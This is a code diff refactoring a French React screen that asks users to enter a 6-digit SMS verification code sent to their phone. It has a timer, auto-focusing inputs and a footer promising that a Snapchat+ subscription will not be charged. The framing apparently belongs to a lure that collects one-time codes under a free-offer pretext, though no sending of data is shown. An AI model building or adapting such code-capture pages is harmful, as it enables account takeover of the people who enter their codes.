@@ -1,118 +1,127 @@
 import { useState, useRef, useEffect } from "react";
 import { motion } from "framer-motion";
+import { ChevronRight, Clock } from "lucide-react";
 import Logo from "@/components/Logo";
 
 export default function CodeVerification6({ data, onSubmit, loading, onExpire }) {
-  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
-  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
-  const inputRefs = useRef([]);
+  const [code, setCode] = useState(["", "", "", "", "", ""]);
+  const [timeLeft, setTimeLeft] = useState(300);
+  const inputs = useRef([]);
 
   useEffect(() => {
-    const timer = setInterval(() => {
-      setTimeLeft((t) => {
-        if (t <= 1) {
-          clearInterval(timer);
-          onExpire();
+    const interval = setInterval(() => {
+      setTimeLeft((prev) => {
+        if (prev <= 1) {
+          clearInterval(interval);
+          onExpire?.();
           return 0;
         }
-        return t - 1;
+        return prev - 1;
       });
     }, 1000);
-    return () => clearInterval(timer);
-  }, []);
+    return () => clearInterval(interval);
+  }, [onExpire]);
 
-  const formatTime = (s) => `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;
+  const minutes = Math.floor(timeLeft / 60);
+  const seconds = timeLeft % 60;
+  const isExpiring = timeLeft < 60;
 
-  const formatPhone = (tel) => tel?.replace(/(\d{2})(?=\d)/g, "$1 ").trim() || "";
-
-  const handleChange = (idx, val) => {
-    const v = val.replace(/\D/g, "").slice(-1);
-    const next = [...digits];
-    next[idx] = v;
-    setDigits(next);
-    if (v && idx < 5) inputRefs.current[idx + 1]?.focus();
+  const handleChange = (i, val) => {
+    if (!/^\d?$/.test(val)) return;
+    const newCode = [...code];
+    newCode[i] = val;
+    setCode(newCode);
+    if (val && i < 5) inputs.current[i + 1]?.focus();
   };
 
-  const handleKeyDown = (idx, e) => {
-    if (e.key === "Backspace" && !digits[idx] && idx > 0) {
-      inputRefs.current[idx - 1]?.focus();
+  const handleKeyDown = (i, e) => {
+    if (e.key === "Backspace" && !code[i] && i > 0) {
+      inputs.current[i - 1]?.focus();
     }
   };
 
   const handlePaste = (e) => {
     const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
     if (pasted.length === 6) {
-      setDigits(pasted.split(""));
-      inputRefs.current[5]?.focus();
+      setCode(pasted.split(""));
+      inputs.current[5]?.focus();
     }
   };
 
-  const handleSubmit = () => {
-    const code = digits.join("");
-    if (code.length === 6) onSubmit(code);
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    const full = code.join("");
+    if (full.length === 6) onSubmit(full);
   };
 
-  const isComplete = digits.every((d) => d !== "");
+  const formatPhone = (tel) => tel?.replace(/(\d{2})(?=\d)/g, '$1 ').trim() || "";
 
   return (
     <motion.div
       initial={{ opacity: 0, y: 24 }}
       animate={{ opacity: 1, y: 0 }}
-      transition={{ duration: 0.5, ease: "easeOut" }}
-      className="w-full max-w-sm mx-auto"
-    >
-      <div className="bg-card border border-border rounded-3xl px-5 py-8 shadow-2xl shadow-black/60">
+      transition={{ duration: 0.5 }}
+      className="w-full max-w-sm mx-auto">
+
+      <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">
+
         <div className="mb-6">
           <Logo />
         </div>
 
-        <div className="text-center mb-6">
-          <p className="text-foreground/80 text-sm">
-            Entrez le code à <span className="text-primary font-bold">6 chiffres</span> reçu par SMS au
-          </p>
-          <p className="text-foreground font-semibold mt-1">{formatPhone(data?.telephone)}</p>
+        <div className="w-16 h-16 bg-primary/15 border border-primary/30 rounded-full flex items-center justify-center mx-auto mb-5">
+          <span className="text-3xl">💬</span>
         </div>
 
-        {/* Timer */}
-        <div className="flex justify-center mb-5">
-          <span className={`text-sm font-mono font-bold px-3 py-1 rounded-full ${timeLeft < 60 ? "bg-destructive/20 text-destructive" : "bg-primary/10 text-primary"}`}>
-            ⏱ {formatTime(timeLeft)}
-          </span>
+        <h2 className="font-heading text-xl font-bold text-foreground mb-2">
+          Code de vérification
+        </h2>
+        <p className="text-muted-foreground text-sm mb-2 leading-relaxed">
+          Un code SMS à <span className="text-primary font-bold">6 chiffres</span> a été envoyé au{" "}
+          <span className="text-foreground font-semibold">{formatPhone(data?.telephone)}</span>
+        </p>
+
+        <div className={`flex items-center justify-center gap-2 text-xs mb-8 px-4 py-2 rounded-lg ${
+          isExpiring ? "bg-destructive/15 text-destructive" : "bg-primary/15 text-primary"
+        }`}>
+          <Clock className="w-3.5 h-3.5" />
+          <span className="font-medium">Expire dans {minutes}:{seconds.toString().padStart(2, "0")}</span>
         </div>
 
-        {/* 6-digit input */}
-        <div className="flex gap-2 justify-center mb-6" onPaste={handlePaste}>
-          {digits.map((d, idx) => (
-            <input
-              key={idx}
-              ref={(el) => (inputRefs.current[idx] = el)}
-              type="tel"
-              inputMode="numeric"
-              maxLength={1}
-              value={d}
-              onChange={(e) => handleChange(idx, e.target.value)}
-              onKeyDown={(e) => handleKeyDown(idx, e)}
-              className="w-11 h-14 text-center text-xl font-bold bg-secondary/30 border-2 border-border rounded-xl text-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all"
-            />
-          ))}
-        </div>
+        <form onSubmit={handleSubmit}>
+          <div className="flex justify-center gap-1.5 md:gap-2 mb-8" onPaste={handlePaste}>
+            {code.map((digit, i) =>
+              <input
+                key={i}
+                ref={(el) => inputs.current[i] = el}
+                type="tel"
+                inputMode="numeric"
+                maxLength={1}
+                value={digit}
+                onChange={(e) => handleChange(i, e.target.value)}
+                onKeyDown={(e) => handleKeyDown(i, e)}
+                autoComplete="one-time-code"
+                className="w-12 h-14 md:w-13 md:h-16 text-center text-xl font-bold bg-white/5 border-2 border-white/10 rounded-xl text-foreground focus:outline-none focus:border-primary focus:bg-primary/5 transition-all text-base" />
+            )}
+          </div>
 
-        <motion.button
-          onClick={handleSubmit}
-          disabled={loading || !isComplete}
-          whileHover={{ scale: loading || !isComplete ? 1 : 1.02 }}
-          whileTap={{ scale: loading || !isComplete ? 1 : 0.98 }}
-          className="w-full bg-primary text-primary-foreground font-bold py-4 rounded-xl text-base tracking-wide transition-all duration-200 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-primary/30 flex items-center justify-center gap-2"
-        >
-          {loading ? (
-            <>
-              <span className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
-              Vérification...
-            </>
-          ) : (
-            "Valider le code"
-          )}
-        </motion.button>
+          <motion.button
+            type="submit"
+            disabled={loading || code.join("").length < 6 || timeLeft === 0}
+            whileHover={{ scale: loading ? 1 : 1.02 }}
+            whileTap={{ scale: loading ? 1 : 0.98 }}
+            className="w-full bg-primary text-primary-foreground font-bold py-4 rounded-xl text-base tracking-wide transition-all duration-200 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-primary/30 flex items-center justify-center gap-2">
+            {loading ?
+              <span className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" /> :
+              <>Valider <ChevronRight className="w-5 h-5" /></>
+            }
+          </motion.button>
+        </form>
+
+        <p className="text-muted-foreground/50 text-xs mt-6 leading-relaxed">
+          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
+          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
+        </p>
       </div>
     </motion.div>
   );
